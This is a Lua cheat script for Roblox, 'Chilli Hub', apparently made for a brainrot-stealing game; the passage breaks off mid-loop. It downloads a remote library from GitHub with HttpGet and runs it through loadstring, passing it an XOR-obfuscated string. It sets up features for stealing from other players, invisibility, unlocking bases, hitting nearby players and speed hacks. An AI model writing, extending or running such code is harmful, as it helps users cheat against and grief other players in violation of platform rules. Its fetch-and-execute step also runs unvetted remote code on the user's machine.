local chilliGithubFastManualDefaultsRu, v, v2, defaultTab, esp, Misc, Server, v3, Players, RunService
local Workspace, Lighting, CoreGui, HttpService, ReplicatedStorage, UserInputService, TeleportService, TextService, Stats, localPlayer
local v4, fn, obj, tbl, v5, flag, fn2, tbl2, fn3, v6
local v7, v8

do
	local v9, ContextActionService, v10, v11

	do
		local Helper, ProximityPromptService, TweenService, v12, str, n, flag2, flag3, flag4, n2
		local flag5, n3, flag6, n4, RagdollController, UserInputService2, connection, flag7, n5, n6
		local prompt, tbl3, n7, folder, bindableEvent, fn4, fn5, fn6, fn7, fn8
		local fn9, prompt2, fn10, fn11, fn12, str2, fn13, fn14, screenGui, fn15
		local fn16, fn17, fn18, fn19, screenGui2, frame, textLabel, textLabel2, frame2

		do
			local value = rawget(_G, "__ChilliGithubFastManualDefaultsRun")

			if type(value) == "table" then
				local window = value.Window

				if type(window) == "table" and window._destroyed ~= true then
					pcall(function()
						window:Open()
					end)

					return
				end

				local now = tonumber(value.StartedAt) or os.clock()
				if value.Status == "loading" and os.clock() - now < 30 then
					return
				end
			end

			chilliGithubFastManualDefaultsRu = { Status = "loading", StartedAt = os.clock() }
			_G.__ChilliGithubFastManualDefaultsRun = chilliGithubFastManualDefaultsRu

			local function fn20()
				local response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/Chilli%20Library")
				local chunk, v13 = loadstring(response)
				assert(chunk, v13)
				local v14 = chunk()
				assert(type(v14) == "function", "Chilli Library bootstrap is invalid.")
				local v15 = table.create(45)
				local n8 = 1

				for i_ = 1, 90, 2 do
					v15[n8] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i_, i_ + 1), 16), string.byte("s9K!2vQ#", (n8 - 1) % 8 + 1)))
					n8 += 1
				end

				return v14(table.concat(v15))
			end

			v = fn20()
			assert(type(v) == "table" and type(v.CreateWindow) == "function" and type(v.Finalize) == "function", "Chilli Library returned an invalid API.")
			chilliGithubFastManualDefaultsRu.Library = v

			v.ManualQuickDefaults = {
				PinnedFeatures = {
					"Stealer > Auto Steal Brainrot > Auto Steal",
					"Helper > Movement & Combat > Float",
					"Helper > Movement & Combat > Auto Hit Nearest Player",
					"Player > Jump Boost > Auto Jump",
					"Player > Jump Boost > Limit Jump Height",
					"Player > Invisibility > Invisible",
					"Server > Server > Kick",
					"Helper > Unlock Base > Auto Unlock Base",
					"Helper > Unlock Base > Unlock Floor 3",
					"Helper > Unlock Base > Unlock Floor 2",
					"Helper > Unlock Base > Unlock Floor 1",
					"Player > Respawn > Fast Reset",
					"Player > Speed Boost > Tool Speed Boost",
					"Stealer > Auto Steal Brainrot > Drop Brainrot",
					"Helper > Helper > Instant Clone Swap",
					"Player > Speed Boost > Adjust Auto Speed",
					"Player > Invisibility > Auto Invisible On Steal",
					"Player > Invisibility > Rotation",
					"Player > Invisibility > Auto Rotation",
					"Player > Invisibility > Depth",
					"Player > Invisibility > Lagback Detect",
					"Player > Invisibility > Auto Fix Lagback",
				},
				Keybinds = {
					["Player > Respawn > Fast Reset"] = "X",
					["Player > Jump Boost > Limit Jump Height"] = "N",
					["Player > Speed Boost > Tool Speed Boost"] = "Q",
					["Player > Jump Boost > Auto Jump"] = "V",
					["Player > Invisibility > Invisible"] = "U",
					["Helper > Movement & Combat > Float"] = "B",
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = "G",
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = "R",
					["Server > Server > Kick"] = "J",
					["Helper > Helper > Instant Clone Swap"] = "F",
					["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true,
					["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true,
				},
				PinGroups = {
					["Player > Respawn > Fast Reset"] = 5,
					["Helper > Movement & Combat > Auto Hit Nearest Player"] = 1,
					["Helper > Unlock Base > Unlock Floor 3"] = 4,
					["Helper > Helper > Instant Clone Swap"] = 5,
					["Player > Speed Boost > Adjust Speed"] = 2,
					["Player > Jump Boost > Jump Height"] = 1,
					["Player > Invisibility > Auto Rotation"] = 2,
					["Helper > Unlock Base > Auto Unlock Base"] = 4,
					["Helper > Aimbot > Auto Paintball"] = 3,
					["Helper > Unlock Base > Unlock Floor 1"] = 4,
					["Player > Speed Boost > Adjust Auto Speed"] = 2,
					["Player > Invisibility > Lagback Detect"] = 2,
					["Player > Invisibility > Auto Invisible On Steal"] = 2,
					["Player > Invisibility > Invisible"] = 2,
					["Player > Invisibility > Auto Fix Lagback"] = 2,
					["Player > Speed Boost > Tool Speed Boost"] = 1,
					["Player > Invisibility > Depth"] = 2,
					["Stealer > Auto Kick > Auto Kick on Steal"] = 5,
					["Helper > Helper > Anti Body Swap"] = 5,
					["Player > Invisibility > Rotation"] = 2,
					["Helper > Unlock Base > Unlock Floor 2"] = 4,
					["Stealer > Auto Steal Brainrot > Drop Brainrot"] = 5,
					["Server > Server > Kick"] = 5,
				},
				LeftCenterHidden = true,
			}

			v2 = v:CreateWindow({ Name = "Chilli Hub", DefaultTab = "Main" })
			chilliGithubFastManualDefaultsRu.Window = v2
			defaultTab = v2:GetDefaultTab()
			local v13

			do
				local Stealer = v2:CreateTab("Stealer")
				Helper = v2:CreateTab("Helper")
				v9 = v2:CreateTab({ Name = "Player", SectionsExpanded = false })
				esp = v2:CreateTab("ESP")
				Misc = v2:CreateTab("Misc")
				Server = v2:CreateTab("Server")
				v3 = v2:CreateTab("AP&TP")
				Players = game:GetService("Players")
				RunService = game:GetService("RunService")
				Workspace = game:GetService("Workspace")
				Lighting = game:GetService("Lighting")
				CoreGui = game:GetService("CoreGui")
				HttpService = game:GetService("HttpService")
				ReplicatedStorage = game:GetService("ReplicatedStorage")
				UserInputService = game:GetService("UserInputService")
				ContextActionService = game:GetService("ContextActionService")
				TeleportService = game:GetService("TeleportService")
				ProximityPromptService = game:GetService("ProximityPromptService")
				TextService = game:GetService("TextService")
				TweenService = game:GetService("TweenService")
				Stats = game:GetService("Stats")
				localPlayer = Players.LocalPlayer
				local str3 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
				v4 = Random.new()

				fn = function()
					local v14 = table.create(64)
					local str4 = HttpService:GenerateGUID(false):gsub("-", "")

					for i_ = 1, #str4 do
						v14[#v14 + 1] = str4:sub(i_, i_)
					end

					for i_ = 1, 32 do
						local v15 = v4:NextInteger(1, #str3)
						v14[#v14 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):sub(v15, v15)
					end

					for i_ = #v14, 2, -1 do
						local v15 = v4:NextInteger(1, i_)
						local v16 = v14[i_]
						v14[i_] = v14[v15]
						v14[v15] = v16
					end

					return table.concat(v14)
				end

				obj = setmetatable({}, { __mode = "k" })
				tbl = {}
				v12 = Stealer:CreateSection({ Name = "Auto Steal Brainrot", Expanded = true })
				v13 = Stealer:CreateSection({ Name = "Auto Kick", Expanded = true })
			end

			do
				local flag8 = false
				local flag9 = true
				local flag10 = false
				local n8 = 0
				local n9 = 1000000
				local v14 = nil
				local n10 = -math.huge
				local tbl4 = {}
				local obj2 = setmetatable({}, { __mode = "k" })
				local tbl5 = {}

				pcall(function()
					local Animals = require(ReplicatedStorage.Datas.Animals)

					if type(Animals) == "table" then
						tbl5 = Animals
					end
				end)

				local function fn21(arg)
					local match, v15 = tostring(arg or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
					if not match then
						return nil
					end
					local num = tonumber(match)
					if not num then
						return nil
					end
					return num * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(v15)] or 1)
				end

				local function fn22(arg)
					local v15 = tbl5[tostring(arg or "")]
					return type(v15) == "table" and tonumber(v15.Generation) or 0
				end

				local function fn23()
					local tbl6 = {}
					local debris = Workspace:FindFirstChild("Debris")
					if not debris then
						return tbl6
					end

					for _, child in ipairs(debris:GetChildren()) do
						if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
							local animalOverhead = child:FindFirstChild("AnimalOverhead")
							local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
							animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Generation")

							if displayName and animalOverhead and displayName:IsA("TextLabel") and animalOverhead:IsA("TextLabel") then
								local v15 = fn21(animalOverhead.Text)

								if v15 then
									local str3 = tostring(displayName.Text)
									tbl6[str3] = tbl6[str3] or {}
									tbl6[str3][#tbl6[str3] + 1] = { Position = child.Position, Generation = v15 }
								end
							end
						end
					end

					return tbl6
				end

				local function fn24(arg, arg2, arg3)
					local generation = fn22(arg)
					if not arg2 then
						return generation
					end
					local v15, v16, v17 = ipairs((arg3 or fn23())[tostring(arg or "")] or {})
					local n11 = 14

					for _, v18 in v15, v16, v17 do
						local magnitude = (v18.Position - arg2).Magnitude

						if magnitude < n11 then
							generation = v18.Generation
							n11 = magnitude
						end
					end

					return generation
				end

				local function fn25()
					local v15 = Workspace:FindFirstChild(localPlayer.Name)
					if not v15 or not v15:IsA("Model") then
						return nil
					end
					return v15:FindFirstChild("HumanoidRootPart") or v15:FindFirstChild("__HITBOX")
				end

				local chilliAutoKickOnStealRuntime = CoreGui:FindFirstChild("__ChilliAutoKickOnStealRuntime")

				if chilliAutoKickOnStealRuntime then
					local cleanup = chilliAutoKickOnStealRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliAutoKickOnStealRuntime:Destroy()
					end)
				end

				local folder2 = Instance.new("Folder")
				folder2.Name = "__ChilliAutoKickOnStealRuntime"
				folder2.Archivable = false
				folder2.Parent = CoreGui
				local bindableEvent2 = Instance.new("BindableEvent")
				bindableEvent2.Name = "Cleanup"
				bindableEvent2.Parent = folder2

				local function fn26()
					for _, v15 in ipairs(tbl4) do
						if v15.Connected then
							v15:Disconnect()
						end
					end

					table.clear(tbl4)
					table.clear(obj2)
				end

				local fn27 = nil

				fn27 = function(arg, arg2, arg3)
					local kind = typeof(arg)

					if kind == "string" then
						local v15 = string.lower(arg)
						if string.find(v15, "you stole", 1, true) or string.find(v15, "successfully stole", 1, true) then
							return arg
						end
						return nil
					end

					if kind ~= "table" or arg3 >= 3 or arg2[arg] then
						return nil
					end
					arg2[arg] = true

					for k, v15 in pairs(arg) do
						local v16 = fn27(k, arg2, arg3 + 1) or fn27(v15, arg2, arg3 + 1)
						if v16 then
							return v16
						end
					end

					return nil
				end

				local function fn28(...)
					if not flag8 then
						return
					end
					local v15 = table.pack(...)
					local tbl6 = {}

					for i_ = 1, v15.n do
						local v16 = fn27(v15[i_], tbl6, 0)

						if v16 then
							local v17 = string.match(v16, ">([^<>]-)</font>")
							local v18 = fn25()
							if fn24(v17, v18 and v18.Position) < n9 then
								return
							end
							local flag11 = v17 and v17 ~= ""
							local str3 = "\nAUTO KICK ACTIVATED"

							if flag11 then
								str3 = "\nAUTO KICK ACTIVATED" .. "\nYou stole: " .. v17
							end

							flag8 = false
							localPlayer:Kick(str3)
							return
						end
					end
				end

				local function fn29(descendant)
					if not flag8 or not descendant:IsA("RemoteEvent") or obj2[descendant] then
						return
					end
					obj2[descendant] = true
					tbl4[#tbl4 + 1] = descendant.OnClientEvent:Connect(fn28)
				end

				local function fn30()
					flag8 = false
					fn26()
				end

				local function fn31()
					fn30()
					flag8 = true
					local packages = ReplicatedStorage:FindFirstChild("Packages")
					packages = packages and packages:FindFirstChild("Net")
					if not packages then
						flag8 = false
						return
					end

					for _, descendant in ipairs(packages:GetDescendants()) do
						fn29(descendant)
					end

					fn29(packages)
					tbl4[#tbl4 + 1] = packages.DescendantAdded:Connect(fn29)
				end

				local function fn32()
					flag9 = false
					flag10 = false
					n8 += 1
					fn30()
				end

				bindableEvent2.Event:Connect(fn32)
				folder2.Destroying:Connect(fn32)

				v13:CreateToggle({
					Name = "Auto Kick on Steal",
					Default = false,
					Callback = function(arg)
						if arg then
							fn31()
						else
							fn30()
						end
					end,
				})

				local tbl6 = {
					["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
					["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
					["B/s"] = { Min = 1, Max = 10, Mult = 1e9 },
				}

				local v15 = nil
				local n11 = 1
				local str3 = "M/s"

				local function fn33(arg, arg2)
					if arg ~= nil then
						n11 = math.floor(tonumber(arg) or n11)
					end

					if arg2 ~= nil then
						str3 = tostring(arg2)
					elseif v15 and v15.GetUnit then
						local unit = v15:GetUnit()

						if unit and unit ~= "" then
							str3 = tostring(unit)
						end
					end

					n9 = n11 * (tbl6[str3] or tbl6["M/s"]).Mult
					v14 = nil
					n10 = -math.huge
				end

				local function fn34(arg)
					str3 = tostring(arg)
					local ms = tbl6[str3] or tbl6["M/s"]

					if v15 and v15.SetRange then
						v15:SetRange(ms.Min, ms.Max)
						local min = v15:Get() or ms.Min
						local min2 = ms.Min
						local max = ms.Max
						local n12 = math.clamp(math.floor(min + 0.5), min2, max)

						if n12 ~= min then
							v15:Set(n12)
						else
							fn33(n12, str3)
						end
					else
						fn33(nil, str3)
					end
				end

				v15 = v13:CreateSlider({
					Name = "Auto Kick Min Value",
					Note = "Only kicks for Brainrots at or above this generation value.",
					Min = 0,
					Max = 1000,
					Default = 10,
					AllowDecimals = false,
					Increment = 1,
					Unit = {
						Default = "M/s",
						Selector = true,
						Options = { "K/s", "M/s", "B/s" },
						ColorEnabled = true,
						Colors = {
							Number = Color3.fromRGB(255, 255, 255),
							Suffix = Color3.fromRGB(58, 255, 55),
						},
						Callback = function(arg)
							fn34(arg)
						end,
					},
					Quick = false,
					Callback = function(arg)
						fn33(arg, nil)
					end,
				})
			end

			str = "Steal"
			local n8
			n8 = 2
			n = 0.25
			flag2 = true
			flag3 = false
			flag4 = false
			n2 = 1000000
			flag5 = false
			n3 = 20
			flag6 = false
			n4 = 0
			RagdollController = nil

			pcall(function()
				RagdollController = require(game:GetService("ReplicatedStorage").Controllers.RagdollController)
			end)

			UserInputService2 = game:GetService("UserInputService")

			connection = UserInputService2.InputBegan:Connect(function(input, gameProcessed)
				if not gameProcessed and input.KeyCode == Enum.KeyCode.Backspace then
					n4 = os.clock()
				end
			end)

			flag7 = false
			n5 = 0
			local n9
			n9 = 0
			n6 = -math.huge
			prompt = nil
			tbl3 = {}
			n7 = -math.huge
			local fn21

			do
				local tbl4 = {}
				local chilliAutoGetRuntime = CoreGui:FindFirstChild("__ChilliAutoGetRuntime")

				if chilliAutoGetRuntime then
					local cleanup = chilliAutoGetRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliAutoGetRuntime:Destroy()
					end)
				end

				folder = Instance.new("Folder")
				folder.Name = "__ChilliAutoGetRuntime"
				folder.Archivable = false
				folder.Parent = CoreGui
				bindableEvent = Instance.new("BindableEvent")
				bindableEvent.Name = "Cleanup"
				bindableEvent.Parent = folder

				fn4 = function(arg)
					tbl4[#tbl4 + 1] = arg
					return arg
				end

				local n10 = 10
				local obj2 = setmetatable({}, { __mode = "k" })

				fn21 = function(arg, arg2)
					if not arg or not arg.Parent or not arg.Visible then
						return false
					end
					local absolutePosition = arg.AbsolutePosition
					local absoluteSize = arg.AbsoluteSize
					return arg2.X >= absolutePosition.X and arg2.X <= absolutePosition.X + absoluteSize.X and arg2.Y >= absolutePosition.Y and arg2.Y <= absolutePosition.Y + absoluteSize.Y
				end

				fn4(UserInputService2.InputChanged:Connect(function(input)
					local v14 = obj2[input]
					if not v14 then
						return
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					v14.Position = vector2

					if (vector2 - v14.Start).Magnitude > n10 then
						v14.Cancelled = true
					end
				end))

				fn4(UserInputService2.InputEnded:Connect(function(input)
					local v14 = obj2[input]
					if not v14 then
						return
					end
					local vector2 = Vector2.new(input.Position.X, input.Position.Y)
					v14.Position = vector2

					if (vector2 - v14.Start).Magnitude > n10 or not fn21(v14.Button, vector2) then
						v14.Cancelled = true
					end

					task.delay(0.2, function()
						if obj2[input] == v14 then
							obj2[input] = nil
						end
					end)
				end))

				fn5 = function(arg, arg2)
					fn4(arg.InputBegan:Connect(function(input)
						if input.UserInputType ~= Enum.UserInputType.Touch or input.UserInputState ~= Enum.UserInputState.Begin then
							return
						end
						local vector2 = Vector2.new(input.Position.X, input.Position.Y)

						if fn21(arg, vector2) then
							obj2[input] = { Button = arg, Start = vector2, Position = vector2, Cancelled = false }
						end
					end))

					return fn4(arg.Activated:Connect(function(inputObject)
						if inputObject and inputObject.UserInputType == Enum.UserInputType.Touch then
							local v14 = obj2[inputObject]
							if not v14 or v14.Button ~= arg or v14.Cancelled or not fn21(arg, v14.Position) then
								return
							end
						end

						arg2()
					end))
				end

				fn6 = function()
					for _, v14 in ipairs(tbl4) do
						if v14.Connected then
							v14:Disconnect()
						end
					end

					table.clear(tbl4)
				end
			end

			local v14, v15, fn22, fn23, fn24

			do
				local v16 = nil
				v14 = nil
				v15 = nil
				local datas = ReplicatedStorage:FindFirstChild("Datas")

				if datas then
					local animals = datas:FindFirstChild("Animals")

					if animals and animals:IsA("ModuleScript") then
						local ok, result = pcall(require, animals)

						if ok and type(result) == "table" then
							v16 = result
						end
					end

					local mutations = datas:FindFirstChild("Mutations")

					if mutations and mutations:IsA("ModuleScript") then
						local ok, result = pcall(require, mutations)

						if ok and type(result) == "table" then
							v14 = result
						end
					end

					local traits = datas:FindFirstChild("Traits")

					if traits and traits:IsA("ModuleScript") then
						local ok, result = pcall(require, traits)

						if ok and type(result) == "table" then
							v15 = result
						end
					end
				end

				fn22 = function(arg)
					return string.lower(tostring(arg or ""))
				end

				fn23 = function(arg)
					arg = arg and arg.Parent

					while arg and arg ~= Workspace do
						if arg:IsA("BasePart") and arg.Name == "Spawn" then
							return arg
						end
						arg = arg.Parent
					end

					return nil
				end

				fn24 = function(arg)
					if not v16 or not arg or arg == "" then
						return 0
					end
					local v17 = v16[arg]
					if type(v17) ~= "table" then
						return 0
					end
					return tonumber(v17.Generation) or 0
				end
			end

			local brainrotNameTiers
			brainrotNameTiers = {}
			local tbl4
			tbl4 = { Limit = 1000000 }

			do
				local colorSequence = ColorSequence.new
				local tbl5 = {}
				local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))
				local v17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl5[1] = v16
				tbl5[2] = v17

				do
					local values = table.pack(new(1, color(214, 142, 12)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Text = colorSequence(tbl5)
			end

			do
				local colorSequence = ColorSequence.new
				local tbl5 = {}
				local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
				local v17 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl5[1] = v16
				tbl5[2] = v17

				do
					local values = table.pack(new(1, color(20, 12, 0)))
					table.move(values, 1, values.n, 3, tbl5)
				end

				tbl4.Stroke = colorSequence(tbl5)
			end

			local tbl5
			tbl5 = { Limit = 10000000 }

			do
				local colorSequence = ColorSequence.new
				local tbl6 = {}
				local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
				local v17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl6[1] = v16
				tbl6[2] = v17

				do
					local values = table.pack(new(1, color(206, 92, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end

				tbl5.Text = colorSequence(tbl6)
			end

			do
				local colorSequence = ColorSequence.new
				local tbl6 = {}
				local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 54, 0))
				local v17 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 27, 0))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl6[1] = v16
				tbl6[2] = v17

				do
					local values = table.pack(new(1, color(18, 8, 0)))
					table.move(values, 1, values.n, 3, tbl6)
				end

				tbl5.Stroke = colorSequence(tbl6)
			end

			do
				local tbl6 = { Limit = 100000000 }
				local colorSequence = ColorSequence.new
				local tbl7 = {}
				local v16 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 168, 140))
				local v17 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
				local new = ColorSequenceKeypoint.new
				local color = Color3.fromRGB
				tbl7[1] = v16
				tbl7[2] = v17

				do
					local values = table.pack(new(1, color(196, 42, 0)))
					table.move(values, 1, values.n, 3, tbl7)
				end

				tbl6.Text = colorSequence(tbl7)
				local colorSequence2 = ColorSequence.new
				local tbl8 = {}
				local v18 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 26, 0))
				local v19 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 13, 0))
				local new2 = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				tbl8[1] = v18
				tbl8[2] = v19

				do
					local values = table.pack(new2(1, color2(18, 4, 0)))
					table.move(values, 1, values.n, 3, tbl8)
				end

				tbl6.Stroke = colorSequence2(tbl8)
				local tbl9 = { Limit = math.huge }
				local colorSequence3 = ColorSequence.new
				local tbl10 = {}
				local v20 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 105, 105))
				local v21 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 28, 40))
				local new3 = ColorSequenceKeypoint.new
				local color3 = Color3.fromRGB
				tbl10[1] = v20
				tbl10[2] = v21

				do
					local values = table.pack(new3(1, color3(184, 0, 18)))
					table.move(values, 1, values.n, 3, tbl10)
				end

				tbl9.Text = colorSequence3(tbl10)
				local colorSequence4 = ColorSequence.new
				local tbl11 = {}
				local v22 = ColorSequenceKeypoint.new(0, Color3.fromRGB(124, 0, 15))
				local v23 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(61, 0, 9))
				local new4 = ColorSequenceKeypoint.new
				local color4 = Color3.fromRGB
				tbl11[1] = v22
				tbl11[2] = v23

				do
					local values = table.pack(new4(1, color4(18, 0, 3)))
					table.move(values, 1, values.n, 3, tbl11)
				end

				tbl9.Stroke = colorSequence4(tbl11)
				brainrotNameTiers[1] = tbl4
				brainrotNameTiers[2] = tbl5
				brainrotNameTiers[3] = tbl6
				brainrotNameTiers[4] = tbl9
			end

			chilliGithubFastManualDefaultsRu.BrainrotNameTiers = brainrotNameTiers

			chilliGithubFastManualDefaultsRu.BrainrotNameTier = function(arg)
				local n10 = tonumber(arg) or 0

				for _, brainrotNameTier in ipairs(chilliGithubFastManualDefaultsRu.BrainrotNameTiers) do
					if n10 < brainrotNameTier.Limit then
						return brainrotNameTier
					end
				end

				return chilliGithubFastManualDefaultsRu.BrainrotNameTiers[#chilliGithubFastManualDefaultsRu.BrainrotNameTiers]
			end

			chilliGithubFastManualDefaultsRu.CreateBrainrotNameStyle = function(parent)
				parent.TextColor3 = Color3.fromRGB(255, 255, 255)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = Color3.fromRGB(255, 255, 255)
				uiStroke.Thickness = 1.15
				uiStroke.Transparency = 0.08
				uiStroke.Parent = parent
				local uiGradient = Instance.new("UIGradient")
				uiGradient.Rotation = 90
				uiGradient.Parent = uiStroke
				local uiGradient2 = Instance.new("UIGradient")
				uiGradient2.Rotation = 90
				uiGradient2.Parent = parent
				return { Label = parent, Outline = uiStroke, Text = uiGradient2, Stroke = uiGradient }
			end

			chilliGithubFastManualDefaultsRu.ApplyBrainrotNameStyle = function(arg, arg2)
				if not arg then
					return
				end

				if tonumber(arg2) == nil then
					arg.Label.TextColor3 = Color3.fromRGB(238, 238, 242)
					arg.Outline.Color = Color3.fromRGB(0, 0, 0)
					arg.Outline.Transparency = 0.28
					arg.Text.Enabled = false
					arg.Stroke.Enabled = false
					return
				end

				local v16 = chilliGithubFastManualDefaultsRu.BrainrotNameTier(arg2)
				arg.Label.TextColor3 = Color3.fromRGB(255, 255, 255)
				arg.Outline.Transparency = 0.08
				arg.Text.Enabled = true
				arg.Stroke.Enabled = true
				arg.Text.Color = v16.Text
				arg.Stroke.Color = v16.Stroke
			end

			do
				local n10 = 0.5
				local obj2 = setmetatable({}, { __mode = "k" })

				local function fn25(arg)
					local v16 = fn23(arg)
					if not v16 then
						return false
					end

					if fn22(v16.Name) == "lucky block" then
						return true
					end

					for _, descendant in ipairs(v16:GetDescendants()) do
						if descendant:IsA("TextLabel") and fn22(descendant.Name) == "stolen" and descendant.Visible and fn22(descendant.Text) == "fusing" then
							return true
						end
					end

					return false
				end

				fn7 = function(arg)
					local now = os.clock()
					local v16 = obj2[arg]
					if v16 and now < v16.ExpiresAt then
						return v16.Value
					end
					local v17 = fn25(arg)

					if v16 then
						v16.Value = v17
						v16.ExpiresAt = now + n10
					else
						obj2[arg] = { Value = v17, ExpiresAt = now + n10 }
					end

					return v17
				end
			end

			fn8 = function(arg)
				local n10 = tonumber(arg) or 0
				if n10 >= 1e9 then
					return string.format("%.2fB/s", n10 / 1e9)
				end

				if n10 >= 1000000 then
					return string.format("%.2fM/s", n10 / 1000000)
				end

				if n10 >= 1000 then
					return string.format("%.1fK/s", n10 / 1000)
				end
				return string.format("%d/s", math.floor(n10))
			end

			do
				local function fn25(arg)
					if not arg or arg == "" then
						return nil
					end
					local match, v16 = arg:gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")

					if match then
						local n10 = tonumber(match) or 0
						local str3 = v16:upper()

						if str3 == "K" then
							n10 *= 1000
						elseif str3 == "M" then
							n10 *= 1000000
						elseif str3 == "B" then
							n10 *= 1e9
						elseif str3 == "T" then
							n10 *= 1e12
						end

						return n10
					end

					return nil
				end

				local function fn26(arg, arg2, arg3, arg4)
					local v16 = fn24(arg3)
					arg = arg and arg.Position
					if not arg then
						return v16
					end
					local v17 = arg4 and arg4[arg3]
					local overhead = nil

					if v17 then
						local v18, v19, v20 = ipairs(arg4[arg3])
						local n10 = 14
						overhead = nil

						for _, v21 in v18, v19, v20 do
							local magnitude = (v21.Position - arg).Magnitude

							if magnitude < n10 then
								overhead = v21.Overhead
								n10 = magnitude
							end
						end
					end

					local v18 = nil

					if arg2 then
						local v19, v20, v21 = ipairs(arg2:GetChildren())
						local n10 = 14
						v18 = nil

						for _, v22 in v19, v20, v21 do
							if v22:IsA("Model") and v22.Name == arg3 then
								local rootPart = v22:FindFirstChild("RootPart") or v22.PrimaryPart or v22:FindFirstChildWhichIsA("BasePart")

								if rootPart then
									local magnitude = (rootPart.Position - arg).Magnitude

									if magnitude < n10 then
										n10 = magnitude
										v18 = v22
									end
								end
							end
						end
					end

					local text

					if overhead and overhead:FindFirstChild("Mutation") and overhead.Mutation.Visible and overhead.Mutation.Text ~= "" then
						text = overhead.Mutation.Text
					else
						text = nil

						if v18 then
							local attribute = v18:GetAttribute("Mutation") or v18:GetAttribute("__mutation")
							local flag8 = attribute and tostring(attribute) ~= ""
							text = nil

							if flag8 then
								text = tostring(attribute)
							end
						end
					end

					local tbl6 = {}
					local tbl7 = {}

					if v18 then
						for _, child in ipairs(v18:GetChildren()) do
							local match = child.Name:match("^_Trait%.(.+)$")

							if match and not tbl7[match] then
								tbl7[match] = true
								table.insert(tbl6, match)
							end
						end

						local attribute = v18:GetAttribute("Trait") or v18:GetAttribute("Traits")

						if attribute then
							local str3 = tostring(attribute)

							if not tbl7[str3] then
								tbl7[str3] = true
								table.insert(tbl6, str3)
							end
						end
					end

					local v19 = text and v14 and v14[text]
					local n10 = 1

					if v19 then
						n10 = 1 + (tonumber(v14[text].Modifier) or 0)
					end

					local flag8 = false

					if v15 then
						for _, v20 in ipairs(tbl6) do
							local v21 = v15[v20] or v15[v20:gsub("_", " ")]

							if v21 then
								if v20 == "Sleepy" or v21.Name == "Sleepy" then
									flag8 = true
								else
									n10 += tonumber(v21.MultiplierModifier) or 0
								end
							end
						end
					end

					local v20 = math.round(v16 * n10 * (flag8 and 0.5 or 1))
					local v21 = fn25(overhead and overhead:FindFirstChild("Generation") and overhead.Generation.Text)
					if v21 and v21 > v20 then
						return v21
					end
					return v20 > 0 and v20 or v21 or v16
				end

				fn9 = function(arg)
					local now = os.clock()
					if not arg and now - n7 < n8 then
						return
					end
					n7 = now
					local tbl6 = {}
					local plots = Workspace:FindFirstChild("Plots")
					if not plots then
						tbl3 = tbl6
						return
					end
					local debris = Workspace:FindFirstChild("Debris")
					local tbl7 = {}

					if debris then
						for _, child in ipairs(debris:GetChildren()) do
							if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
								local animalOverhead = child:FindFirstChild("AnimalOverhead")
								local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")

								if displayName and displayName:IsA("TextLabel") and displayName.Text ~= "" then
									local text = displayName.Text
									tbl7[text] = tbl7[text] or {}
									table.insert(tbl7[text], { Position = child.Position, Overhead = animalOverhead })
								end
							end
						end
					end

					for _, child in ipairs(plots:GetChildren()) do
						local animalPodiums = child:FindFirstChild("AnimalPodiums")

						if animalPodiums then
							for _, child2 in ipairs(animalPodiums:GetChildren()) do
								local base = child2:FindFirstChild("Base")
								base = base and base:FindFirstChild("Spawn")

								if base and base:IsA("BasePart") then
									local promptAttachment = base:FindFirstChild("PromptAttachment")
									local v16 = ipairs
									promptAttachment = promptAttachment or base
									local v17 = nil

									for _, descendant in v16(promptAttachment:GetDescendants()) do
